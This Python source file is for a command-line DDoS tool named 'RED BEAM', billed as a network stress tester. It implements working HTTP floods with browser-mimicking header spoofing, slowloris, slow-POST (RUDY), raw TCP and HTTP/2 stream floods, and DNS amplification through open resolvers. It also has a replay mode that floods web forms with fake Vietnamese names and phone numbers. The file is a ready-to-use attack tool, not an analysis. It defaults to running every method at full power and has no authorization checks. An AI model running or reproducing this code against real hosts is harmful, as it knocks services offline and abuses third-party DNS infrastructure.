import asyncio
import os
import random
import shutil
import socket
import ssl
import string
import subprocess
import threading
import time
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse

import click
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.table import Table

console = Console()

RUST_BINARY = "hot-beam"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
]

REFERERS = [
    "https://www.google.com/search?q=", "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=", "https://www.youtube.com/", "",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8",
]


class Method(str, Enum):
    HTTP_FLOOD = "flood"
    HTTP_BYPASS = "bypass"
    SLOWLORIS = "slowloris"
    TCP_FLOOD = "tcp"
    HTTP2_FLOOD = "h2flood"
    RUDY = "rudy"
    REPEAT = "repeat"
    DNS_AMP = "dns-amp"
    ALL = "all"


# Domains with large DNS responses for amplification testing
DNS_AMP_DOMAINS = [
    ("paypal.com", 16, "TXT"),
    ("google.com", 16, "TXT"),
    ("facebook.com", 16, "TXT"),
    ("microsoft.com", 16, "TXT"),
    ("amazon.com", 16, "TXT"),
    ("apple.com", 16, "TXT"),
]


def build_dns_query(domain: str, qtype: int = 16) -> bytes:
    """Build a raw DNS query packet."""
    txid = random.randint(0, 65535).to_bytes(2, "big")
    header = txid + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    qname = b""
    for label in domain.split("."):
        qname += bytes([len(label)]) + label.encode()
    qname += b"\x00"
    question = qname + qtype.to_bytes(2, "big") + b"\x00\x01"
    return header + question


def load_dns_slaves(path: str) -> list[str]:
    """Load DNS resolver IPs from file. Returns list of 'ip:port' strings."""
    resolvers = []
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" not in line:
                    line = f"{line}:53"
                resolvers.append(line)
    except FileNotFoundError:
        console.print(f"[red]DNS slaves file not found: {path}[/]")
    return resolvers


def probe_dns_slave(resolver: str, timeout: float = 3.0) -> dict:
    """Probe a single DNS resolver and measure its amplification performance."""
    ip, port = resolver.rsplit(":", 1)
    port = int(port)
    result = {
        "resolver": resolver,
        "ip": ip,
        "port": port,
        "status": "offline",
        "latency_ms": 0,
        "tests": [],
        "avg_amp": 0,
        "max_amp": 0,
        "max_resp": 0,
        "total_resp_bytes": 0,
    }

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)

    amps = []
    for domain, qtype, qtype_name in DNS_AMP_DOMAINS:
        query = build_dns_query(domain, qtype)
        query_len = len(query)
        try:
            t0 = time.time()
            sock.sendto(query, (ip, port))
            data, _ = sock.recvfrom(4096)
            latency = (time.time() - t0) * 1000
            resp_len = len(data)
            amp = resp_len / query_len if query_len > 0 else 0

            test = {
                "domain": domain,
                "type": qtype_name,
                "query_bytes": query_len,
                "resp_bytes": resp_len,
                "amp": amp,
                "latency_ms": latency,
            }
            result["tests"].append(test)
            result["total_resp_bytes"] += resp_len
            amps.append(amp)

            if resp_len > result["max_resp"]:
                result["max_resp"] = resp_len
                result["max_amp"] = amp
            result["latency_ms"] = latency
            result["status"] = "online"
        except (socket.timeout, OSError):
            result["tests"].append({
                "domain": domain, "type": qtype_name,
                "query_bytes": query_len, "resp_bytes": 0, "amp": 0, "latency_ms": 0,
            })

    sock.close()
    if amps:
        result["avg_amp"] = sum(amps) / len(amps)
    return result


def probe_all_slaves(slave_file: str) -> list[dict]:
    """Probe all DNS slaves and return performance data."""
    resolvers = load_dns_slaves(slave_file)
    if not resolvers:
        return []

    results = []
    for r in resolvers:
        results.append(probe_dns_slave(r))
    return results


def display_slave_table(probe_results: list[dict]):
    """Display a Rich table showing DNS slave performance."""
    from rich.table import Table as RichTable

    # Summary table
    table = RichTable(
        title="[bold red]⚡ DNS Amplification Slaves[/]",
        border_style="red",
        show_lines=True,
    )
    table.add_column("#", style="dim", width=3)
    table.add_column("Resolver IP", style="cyan", width=20)
    table.add_column("Status", width=8)
    table.add_column("Latency", style="yellow", width=10, justify="right")
    table.add_column("Avg Amp", style="green", width=10, justify="right")
    table.add_column("Max Amp", style="bold green", width=10, justify="right")
    table.add_column("Max Resp", style="magenta", width=12, justify="right")
    table.add_column("Total Resp", style="white", width=12, justify="right")

    online = 0
    total_max_amp = 0

    for i, r in enumerate(probe_results):
        status = "[green]ONLINE[/]" if r["status"] == "online" else "[red]OFFLINE[/]"
        if r["status"] == "online":
            online += 1
            if r["max_amp"] > total_max_amp:
                total_max_amp = r["max_amp"]

        latency = f"{r['latency_ms']:.0f}ms" if r["latency_ms"] > 0 else "-"
        avg_amp = f"{r['avg_amp']:.1f}x" if r["avg_amp"] > 0 else "-"
        max_amp = f"{r['max_amp']:.1f}x" if r["max_amp"] > 0 else "-"
        max_resp = f"{r['max_resp']} B" if r["max_resp"] > 0 else "-"
        total_resp = f"{r['total_resp_bytes']} B" if r["total_resp_bytes"] > 0 else "-"

        table.add_row(str(i + 1), r["resolver"], status, latency, avg_amp, max_amp, max_resp, total_resp)

    console.print(table)

    # Per-domain breakdown for online resolvers
    online_results = [r for r in probe_results if r["status"] == "online"]
    if online_results:
        detail = RichTable(
            title="[bold]Per-Domain Amplification Detail[/]",
            border_style="dim",
        )
        detail.add_column("Resolver", style="cyan", width=18)
        detail.add_column("Domain", style="white", width=16)
        detail.add_column("Type", style="dim", width=5)
        detail.add_column("Query", style="yellow", width=8, justify="right")
        detail.add_column("Response", style="green", width=10, justify="right")
        detail.add_column("Amp Factor", style="bold green", width=12, justify="right")
        detail.add_column("Latency", style="yellow", width=10, justify="right")

        for r in online_results:
            for t in r["tests"]:
                amp_style = "bold green" if t["amp"] >= 10 else "green" if t["amp"] >= 5 else "yellow" if t["amp"] > 1 else "red"
                amp_str = f"[{amp_style}]{t['amp']:.1f}x[/]" if t["amp"] > 0 else "[red]FAIL[/]"
                lat_str = f"{t['latency_ms']:.0f}ms" if t["latency_ms"] > 0 else "-"
                detail.add_row(
                    r["resolver"], t["domain"], t["type"],
                    f"{t['query_bytes']} B", f"{t['resp_bytes']} B",
                    amp_str, lat_str,
                )

        console.print(detail)

    # Summary line
    console.print(f"\n  [bold]Slaves:[/] {online}/{len(probe_results)} online | "
                  f"[bold]Best amplification:[/] [bold green]{total_max_amp:.1f}x[/]\n")


@dataclass
class Stats:
    total_sent: int = 0
    total_success: int = 0
    total_fail: int = 0
    bytes_sent: int = 0
    start_time: float = field(default_factory=time.time)
    _lock: threading.Lock = field(default_factory=threading.Lock)
    _per_second: list = field(default_factory=list)
    peak_rps: int = 0

    def hit(self, success=True, nbytes=0):
        with self._lock:
            self.total_sent += 1
            self.bytes_sent += nbytes
            if success:
                self.total_success += 1
            else:
                self.total_fail += 1
            self._per_second.append(time.time())

    def snapshot_rps(self):
        with self._lock:
            now = time.time()
            self._per_second = [t for t in self._per_second if now - t < 1.0]
            rps = len(self._per_second)
            if rps > self.peak_rps:
                self.peak_rps = rps
            return rps

    @property
    def elapsed(self):
        return time.time() - self.start_time

    @property
    def avg_rps(self):
        e = self.elapsed
        return self.total_sent / e if e > 0 else 0


def rand_str(n):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def rand_path():
    exts = ["", "", ".js", ".css", ".png", ".jpg", ".json"]
    segments = random.randint(1, 3)
    return "/".join(rand_str(random.randint(3, 12)) for _ in range(segments)) + random.choice(exts)


def rand_query():
    return "&".join(f"{rand_str(random.randint(2,6))}={rand_str(random.randint(3,10))}" for _ in range(random.randint(1, 4)))


def mimic_headers(host):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Dest": random.choice(["document", "empty", "script"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors"]),
        "Upgrade-Insecure-Requests": "1",
    }
    ref = random.choice(REFERERS)
    if ref:
        headers["Referer"] = ref + rand_str(8)
    if random.random() < 0.3:
        headers["Cookie"] = f"_ga=GA1.2.{random.randint(100000,999999)}.{int(time.time())}"
    return headers


async def attack_http_flood(session, target, stats, psize):
    import aiohttp
    url = target if random.random() < 0.5 else f"{target}/{rand_path()}?{rand_query()}"
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    payload = rand_str(psize) if random.random() < 0.4 else None
    method = "POST" if payload else "GET"
    try:
        async with session.request(method, url, headers=headers, data=payload,
                                    timeout=aiohttp.ClientTimeout(total=10), ssl=False) as r:
            await r.read()
            stats.hit(True, psize if payload else 0)
    except Exception:
        stats.hit(False)


async def attack_http_bypass(session, target, stats, psize):
    import aiohttp
    parsed = urlparse(target)
    url = f"{parsed.scheme}://{parsed.netloc}/{rand_path()}?{rand_query()}&_={rand_str(8)}"
    headers = mimic_headers(parsed.netloc)
    payload = rand_str(min(psize, 256)) if random.random() < 0.2 else None
    method = "POST" if payload else "GET"
    try:
        async with session.request(method, url, headers=headers, data=payload,
                                    timeout=aiohttp.ClientTimeout(total=12),
                                    ssl=False, allow_redirects=True) as r:
            await r.read()
            stats.hit(True, len(payload) if payload else 0)
    except Exception:
        stats.hit(False)


async def attack_slowloris(target, stats, stop_event, delay):
    parsed = urlparse(target)
    host, port = parsed.hostname, parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl = parsed.scheme == "https"
    try:
        r, w = await asyncio.open_connection(host, port, ssl=use_ssl if use_ssl else None,
                                              server_hostname=host if use_ssl else None)
        w.write(f"GET /{rand_path()} HTTP/1.1\r\nHost: {host}\r\n".encode())
        await w.drain()
        stats.hit(True, 50)
        while not stop_event.is_set():
            try:
                w.write(f"X-{rand_str(6)}: {rand_str(12)}\r\n".encode())
                await w.drain()
                stats.hit(True, 30)
            except Exception:
                break
            await asyncio.sleep(delay / 1000.0)
        w.close()
    except Exception:
        stats.hit(False)


async def attack_rudy(target, stats, stop_event, delay):
    parsed = urlparse(target)
    host, port = parsed.hostname, parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl = parsed.scheme == "https"
    try:
        r, w = await asyncio.open_connection(host, port, ssl=use_ssl if use_ssl else None,
                                              server_hostname=host if use_ssl else None)
        cl = random.randint(100000, 1000000)
        hdr = f"POST /{rand_path()} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {cl}\r\n\r\n"
        w.write(hdr.encode())
        await w.drain()
        stats.hit(True, len(hdr))
        sent = 0
        while not stop_event.is_set() and sent < cl:
            try:
                w.write(rand_str(1).encode())
                await w.drain()
                sent += 1
                stats.hit(True, 1)
            except Exception:
                break
            await asyncio.sleep(delay / 1000.0)
        w.close()
    except Exception:
        stats.hit(False)


async def attack_dns_amp_py(stats, stop_event, resolvers):
    """Python fallback for DNS amplification attack."""
    while not stop_event.is_set():
        resolver_str = random.choice(resolvers)
        ip, port = resolver_str.rsplit(":", 1)
        port = int(port)
        domain, qtype, _ = random.choice(DNS_AMP_DOMAINS)
        query = build_dns_query(domain, qtype)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(query, (ip, port))
            data, _ = sock.recvfrom(4096)
            stats.hit(True, len(data))
            sock.close()
        except Exception:
            stats.hit(False)
            try:
                sock.close()
            except Exception:
                pass
        await asyncio.sleep(0)  # yield to event loop


async def attack_tcp_flood(target, stats, psize):
    parsed = urlparse(target)
    host, port = parsed.hostname, parsed.port or (443 if parsed.scheme == "https" else 80)
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=5)
        payload = os.urandom(psize)
        for _ in range(random.randint(1, 4)):
            w.write(payload)
            await w.drain()
            stats.hit(True, psize)
        w.close()
    except Exception:
        stats.hit(False)


async def attack_h2_flood(target, stats):
    parsed = urlparse(target)
    host, port = parsed.hostname, parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl = parsed.scheme == "https"
    try:
        ctx = None
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])
        r, w = await asyncio.open_connection(host, port, ssl=ctx,
                                              server_hostname=host if use_ssl else None)
        w.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")
        await w.drain()
        await asyncio.sleep(0.03)
        w.write(b"\x00\x00\x00\x04\x01\x00\x00\x00\x00")
        await w.drain()
        buf = bytearray()
        for i in range(random.randint(50, 200)):
            sid = (1 + i * 2).to_bytes(4, "big")
            path = f"/{rand_path()}".encode()[:64]
            hdr = b"\x82\x86\x44" + bytes([len(path)]) + path
            buf += len(hdr).to_bytes(3, "big") + b"\x01\x05" + sid[1:] + hdr
            buf += b"\x00\x00\x04\x03\x00" + sid[1:] + b"\x00\x00\x00\x08"
        w.write(buf)
        await w.drain()
        stats.hit(True, len(buf))
        w.close()
    except Exception:
        stats.hit(False)


def build_dashboard(stats, target, method, threads, duration):
    elapsed = stats.elapsed
    remaining = max(0, duration - elapsed)
    rps = stats.snapshot_rps()
    pct = min(elapsed / duration, 1.0) if duration > 0 else 0
    bar_w = 30
    filled = int(bar_w * pct)
    bar = f"[red]{'█' * filled}[/][dim]{'░' * (bar_w - filled)}[/] {pct*100:.0f}%"

    t = Table(show_header=False, box=None, padding=(0, 2))
    t.add_column(style="bold cyan", width=16)
    t.add_column(style="white")
    t.add_row("Target", f"[bold yellow]{target}[/]")
    t.add_row("Method", f"[bold magenta]{method}[/]")
    t.add_row("Threads", f"{threads}")
    t.add_row("Duration", f"{elapsed:.0f}s / {duration}s  [dim]({remaining:.0f}s left)[/]")
    t.add_row("", "")
    t.add_row("Requests/s", f"[bold green]{rps}[/]")
    t.add_row("Peak RPS", f"[bold green]{stats.peak_rps}[/]")
    t.add_row("Avg RPS", f"[bold]{stats.avg_rps:.0f}[/]")
    t.add_row("", "")
    t.add_row("Total Sent", f"[bold]{stats.total_sent:,}[/]")
    t.add_row("Success", f"[green]{stats.total_success:,}[/]")
    t.add_row("Failed", f"[red]{stats.total_fail:,}[/]")
    t.add_row("Data Sent", f"{stats.bytes_sent / 1024 / 1024:.1f} MB")
    t.add_row("", "")
    t.add_row("Progress", bar)
    return Panel(t, title="[bold red]⚡ RED BEAM ⚡[/]", border_style="red", padding=(1, 2))


async def run_python_attack(target, method, threads, duration, psize, delay, dns_resolvers=None):
    import aiohttp
    stats = Stats()
    stop_event = asyncio.Event()
    parsed = urlparse(target)
    if not parsed.scheme:
        target = f"https://{target}"

    connector = aiohttp.TCPConnector(limit=threads*2, limit_per_host=threads*2, ssl=False,
                                      force_close=False, enable_cleanup_closed=True)
    if method == Method.ALL:
        methods = [Method.HTTP_FLOOD, Method.HTTP_BYPASS, Method.SLOWLORIS, Method.TCP_FLOOD,
                   Method.HTTP2_FLOOD, Method.RUDY]
        if dns_resolvers:
            methods.append(Method.DNS_AMP)
    else:
        methods = [method]

    async def worker(session, m):
        while not stop_event.is_set():
            try:
                if m == Method.HTTP_FLOOD:
                    await attack_http_flood(session, target, stats, psize)
                elif m == Method.HTTP_BYPASS:
                    await attack_http_bypass(session, target, stats, psize)
                elif m == Method.SLOWLORIS:
                    await attack_slowloris(target, stats, stop_event, delay)
                elif m == Method.TCP_FLOOD:
                    await attack_tcp_flood(target, stats, psize)
                elif m == Method.HTTP2_FLOOD:
                    await attack_h2_flood(target, stats)
                elif m == Method.RUDY:
                    await attack_rudy(target, stats, stop_event, delay)
                elif m == Method.DNS_AMP:
                    if dns_resolvers:
                        await attack_dns_amp_py(stats, stop_event, dns_resolvers)
                    else:
                        break
            except asyncio.CancelledError:
                break
            except Exception:
                stats.hit(False)
                await asyncio.sleep(0.01)

    async with aiohttp.ClientSession(connector=connector) as session:
        tpm = max(1, threads // len(methods))
        tasks = [asyncio.create_task(worker(session, m)) for m in methods for _ in range(tpm)]
        method_label = method.value if isinstance(method, Method) else method
        with Live(build_dashboard(stats, target, method_label, threads, duration),
                  console=console, refresh_per_second=2) as live:
            start = time.time()
            while time.time() - start < duration:
                await asyncio.sleep(0.5)
                live.update(build_dashboard(stats, target, method_label, threads, duration))
        stop_event.set()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
    return stats


def find_rust_binary() -> str | None:
    """Find the hot-beam Rust binary. Checks PATH, then common local build paths."""
    found = shutil.which(RUST_BINARY)
    if found:
        return found
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    candidates = [
        os.path.join(base, "tools", "rust", "hot_beam_rs", "target", "release", "hot-beam"),
        os.path.join(base, "target", "release", "hot-beam"),
    ]
    for c in candidates:
        if os.path.isfile(c) and os.access(c, os.X_OK):
            return c
    return None


def has_rust_binary():
    return find_rust_binary() is not None


def run_rust_attack(target, method, threads, duration, psize, delay, no_recon,
                    request_method=None, headers=None, body=None, body_file=None,
                    req_file=None, req_path=None, rand_query=False, dns_slaves=None):
    binary = find_rust_binary() or RUST_BINARY
    cmd = [
        binary, "fire", target,
        "-m", method,
        "-t", str(threads),
        "-d", str(duration),
        "--packet-size", str(psize),
        "--packet-delay", str(delay),
    ]
    if no_recon:
        cmd.append("--no-recon")
    if request_method:
        cmd.extend(["-X", request_method])
    if headers:
        for h in headers:
            cmd.extend(["-H", h])
    if body:
        cmd.extend(["-B", body])
    if body_file:
        cmd.extend(["--body-file", body_file])
    if req_file:
        cmd.extend(["--req-file", req_file])
    if req_path:
        cmd.extend(["--path", req_path])
    if rand_query:
        cmd.append("--rand-query")
    if dns_slaves:
        cmd.extend(["--dns-slaves", dns_slaves])
    try:
        proc = subprocess.run(cmd, timeout=duration + 30)
        return proc.returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except KeyboardInterrupt:
        return False


def run_rust_repeat(target, http_method, threads, duration, headers=None,
                    body=None, body_file=None, req_file=None, endpoints=None,
                    rand_query=False, no_recon=False, dry_run=False):
    binary = find_rust_binary() or RUST_BINARY
    cmd = [binary, "repeat", target, "-X", http_method,
           "-t", str(threads), "-d", str(duration)]
    if headers:
        for h in headers:
            cmd.extend(["-H", h])
    if body:
        cmd.extend(["-B", body])
    if body_file:
        cmd.extend(["--body-file", body_file])
    if req_file:
        cmd.extend(["--req-file", req_file])
    if endpoints:
        for e in endpoints:
            cmd.extend(["-e", e])
    if rand_query:
        cmd.append("--rand-query")
    if no_recon:
        cmd.append("--no-recon")
    if dry_run:
        cmd.append("--dry-run")
    try:
        proc = subprocess.run(cmd, timeout=duration + 30)
        return proc.returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except KeyboardInterrupt:
        return False


def check_target(target):
    parsed = urlparse(target if "://" in target else f"https://{target}")
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    console.print("\n[bold cyan]⚡ RED BEAM - Target Recon[/]")
    console.print(f"[dim]{'─' * 45}[/]")
    try:
        ip = socket.gethostbyname(host)
        console.print(f"  Host:     [yellow]{host}[/] ({ip})")
    except socket.gaierror:
        console.print(f"  [red]Cannot resolve {host}[/]")
        return False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        s.close()
        console.print(f"  Port:     [green]{port} OPEN[/]")
    except Exception:
        console.print(f"  Port:     [red]{port} CLOSED[/]")
        return False
    try:
        import urllib3
        urllib3.disable_warnings()
        import requests
        resp = requests.head(target if "://" in target else f"https://{target}", timeout=5, verify=False, allow_redirects=True)
        console.print(f"  Server:   [yellow]{resp.headers.get('server', '(hidden)')}[/]")
        console.print(f"  Status:   [green]{resp.status_code}[/]")
    except Exception as e:
        console.print(f"  HTTP:     [red]Failed ({e})[/]")
    console.print(f"[dim]{'─' * 45}[/]\n")
    return True


class BeamGroup(click.Group):
    def parse_args(self, ctx, args):
        if args and args[0] not in self.commands and not args[0].startswith("-"):
            args.insert(0, "fire")
        return super().parse_args(ctx, args)


@click.group("beam", cls=BeamGroup, invoke_without_command=True)
@click.pass_context
def beam_command(ctx):
    """Network stress testing tool.

    \b
    Subcommands:
      fire      - Multi-method attack (default when target given directly)
      repeat    - Replay custom HTTP requests at high speed

    \b
    Examples:
      hot beam target.com                          # fire mode (default)
      hot beam target.com -t 1000 -d 300           # fire with options
      hot beam repeat https://api.example.com ...  # repeat mode
    """
    if ctx.invoked_subcommand is None:
        click.echo(ctx.get_help())


@beam_command.command("fire")
@click.argument("target")
@click.option("-m", "--method", type=click.Choice([m.value for m in Method], case_sensitive=False),
              default="all", show_default=True, help="Attack method")
@click.option("-t", "--threads", type=int, default=500, show_default=True, help="Concurrent workers")
@click.option("-d", "--duration", type=int, default=120, show_default=True, help="Duration in seconds")
@click.option("--packet-size", type=int, default=512, show_default=True, help="Payload size in bytes")
@click.option("--packet-delay", type=int, default=500, show_default=True, help="Delay between packets in ms (slowloris/rudy)")
@click.option("--dns-slaves", default=None, help="File with open DNS resolver IPs for dns-amp mode")
@click.option("--no-recon", is_flag=True, help="Skip target recon before attack")
@click.option("--python", "force_python", is_flag=True, help="Force Python engine (skip Rust)")
@click.option("-X", "--request-method", default=None, help="HTTP method for repeat (GET/POST/PUT/DELETE)")
@click.option("-H", "--header", "headers", multiple=True, help="Header 'Key: Value' (repeatable)")
@click.option("-B", "--body", default=None, help="Request body string")
@click.option("--body-file", default=None, help="Read body from file")
@click.option("--req-file", default=None, help="Raw HTTP request file")
@click.option("--path", "req_path", default=None, help="Request path for repeat mode")
@click.option("--rand-query", is_flag=True, help="Add random query param per request")
def fire_command(target, method, threads, duration, packet_size, packet_delay, dns_slaves, no_recon,
                 force_python, request_method, headers, body, body_file, req_file, req_path, rand_query):
    """Multi-method network stress testing - Full power by default.

    \b
    Default: ALL methods, 500 threads, 120s duration.
    DNS amplification auto-enabled when dns_slaves.txt is found.

    \b
    Methods:
      all       - All methods simultaneously (default)
      flood     - HTTP GET/POST flood with random paths
      bypass    - HTTP flood mimicking real browser (cookies, redirects, headers)
      slowloris - Hold connections open with partial headers
      rudy      - R-U-Dead-Yet: slow POST body attack
      tcp       - Raw TCP flood with random data
      h2flood   - HTTP/2 rapid stream creation + reset
      dns-amp   - DNS amplification via open resolvers
      repeat    - Replay custom request (use 'hot beam repeat' instead)

    \b
    Examples:
      hot beam target.com                          # full power, all methods
      hot beam target.com -t 1000 -d 300           # 1000 threads, 5 min
      hot beam target.com -m bypass -t 200         # single method
      hot beam target.com -m dns-amp --dns-slaves slaves.txt
      hot beam target.com --python                 # force Python engine
    """
    use_rust = has_rust_binary() and not force_python

    if use_rust:
        engine_label = "[bold green]Rust[/] (hot-beam)"
    else:
        engine_label = "[bold yellow]Python[/] (aiohttp)"

    # DNS amplification: auto-detect slaves, graceful fallback
    is_dns_mode = method in ("dns-amp", "all")
    dns_available = False
    if is_dns_mode:
        if not dns_slaves:
            base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            candidates = [
                "dns_slaves.txt",
                "tools/rust/hot_beam_rs/dns_slaves.txt",
                os.path.join(base_dir, "dns_slaves.txt"),
                os.path.join(base_dir, "tools", "rust", "hot_beam_rs", "dns_slaves.txt"),
            ]
            for c in candidates:
                if os.path.exists(c):
                    dns_slaves = c
                    break

        if dns_slaves and os.path.exists(dns_slaves):
            console.print(f"[bold cyan]Probing DNS slaves from:[/] {dns_slaves}\n")
            probe_results = probe_all_slaves(dns_slaves)
            if probe_results:
                display_slave_table(probe_results)
                online_count = sum(1 for r in probe_results if r["status"] == "online")
                if online_count > 0:
                    dns_available = True
                else:
                    console.print("[yellow]All DNS resolvers offline, skipping dns-amp[/]\n")
            else:
                console.print("[yellow]No resolvers in slave file, skipping dns-amp[/]\n")
        else:
            if method == "dns-amp":
                console.print("[red]dns-amp requires --dns-slaves <file>[/]")
                console.print("[dim]Create a file with one resolver IP per line[/]")
                return
            else:
                console.print("[dim]No dns_slaves.txt found, skipping dns-amp layer[/]\n")

    if not no_recon and not use_rust:
        if not check_target(target):
            console.print("[red]Target unreachable. Use --no-recon to skip check.[/]")
            return

    console.print(f"[bold red]⚡ RED BEAM[/] | Engine: {engine_label} | {method} | {threads} threads | {duration}s\n")

    if use_rust:
        run_rust_attack(target, method, threads, duration, packet_size, packet_delay, no_recon,
                        request_method=request_method, headers=list(headers) if headers else None,
                        body=body, body_file=body_file, req_file=req_file,
                        req_path=req_path, rand_query=rand_query,
                        dns_slaves=dns_slaves if dns_available else None)
    else:
        attack_method = Method(method)
        dns_resolvers = load_dns_slaves(dns_slaves) if (dns_slaves and dns_available) else None
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            stats = loop.run_until_complete(
                run_python_attack(target, attack_method, threads, duration, packet_size, packet_delay,
                                  dns_resolvers=dns_resolvers)
            )
            loop.close()
        except KeyboardInterrupt:
            console.print("\n[yellow]Beam terminated[/]")
            return

        console.print("\n[bold red]⚡ BEAM COMPLETE[/]")
        console.print(f"[dim]{'─' * 45}[/]")
        console.print(f"  Total:    [bold]{stats.total_sent:,}[/] requests")
        console.print(f"  Success:  [green]{stats.total_success:,}[/]")
        console.print(f"  Failed:   [red]{stats.total_fail:,}[/]")
        console.print(f"  Data:     {stats.bytes_sent / 1024 / 1024:.1f} MB")
        console.print(f"  Duration: {stats.elapsed:.1f}s")
        console.print(f"  Avg RPS:  {stats.avg_rps:.0f}")
        console.print(f"  Peak RPS: {stats.peak_rps}")
        console.print(f"[dim]{'─' * 45}[/]")


@beam_command.command("repeat")
@click.argument("target")
@click.option("-X", "--method", "http_method", default="GET", show_default=True,
              help="HTTP method (GET/POST/PUT/DELETE/PATCH)")
@click.option("-H", "--header", "headers", multiple=True,
              help="Header 'Key: Value' (repeatable)")
@click.option("-B", "--body", default=None,
              help="Request body string (supports {{rand_name}}, {{rand_phone}}, etc.)")
@click.option("--body-file", default=None, type=click.Path(exists=True),
              help="JSON file with body template")
@click.option("--req-file", default=None, type=click.Path(exists=True),
              help="Raw HTTP request file (Burp format)")
@click.option("-e", "--endpoint", "endpoints", multiple=True,
              help="Additional endpoint URLs for round-robin (repeatable)")
@click.option("-t", "--threads", type=int, default=50, show_default=True,
              help="Concurrent workers")
@click.option("-d", "--duration", type=int, default=120, show_default=True,
              help="Duration in seconds")
@click.option("--rand-query", is_flag=True,
              help="Add random query param per request")
@click.option("--no-recon", is_flag=True, help="Skip target recon")
@click.option("--dry-run", is_flag=True,
              help="Send 1 request and show response, then exit")
@click.option("--python", "force_python", is_flag=True, help="Force Python engine")
def repeat_command(target, http_method, headers, body, body_file, req_file,
                   endpoints, threads, duration, rand_query, no_recon, dry_run, force_python):
    """Replay custom HTTP requests at high speed with template variables.

    \b
    Template variables (auto-replaced per request):
      {{rand_name}}   - Random Vietnamese name
      {{rand_phone}}  - Random VN phone number
      {{rand_email}}  - Random email address
      {{rand_addr}}   - Random VN street address
      {{rand_str}}    - Random 10-char string
      {{rand_int}}    - Random integer 1-99999
      {{seq}}         - Sequential counter (0, 1, 2, ...)

    \b
    Examples:
      hot beam repeat https://api.example.com/form -X POST \\
        -H "Content-Type: application/json" \\
        -B '{"name":"{{rand_name}}","phone":"{{rand_phone}}"}' \\
        -t 100 -d 60

      hot beam repeat https://api.example.com/form \\
        --body-file payload.json -t 200 -d 300

      hot beam repeat https://api1.example.com/sendform \\
        -e https://api2.example.com/sendform \\
        --body-file payload.json -t 100
    """
    if has_rust_binary() and not force_python:
        run_rust_repeat(target, http_method, threads, duration,
                        headers=list(headers) if headers else None,
                        body=body, body_file=body_file, req_file=req_file,
                        endpoints=list(endpoints) if endpoints else None,
                        rand_query=rand_query, no_recon=no_recon, dry_run=dry_run)
    else:
        from hot_omelet.beam_repeat import repeat_command as py_repeat
        ctx = click.Context(py_repeat)
        ctx.invoke(py_repeat, target=target, http_method=http_method,
                   headers=headers, body=body, body_file=body_file,
                   req_file=req_file, endpoints=endpoints, threads=threads,
                   duration=duration, rand_query=rand_query, dry_run=dry_run)
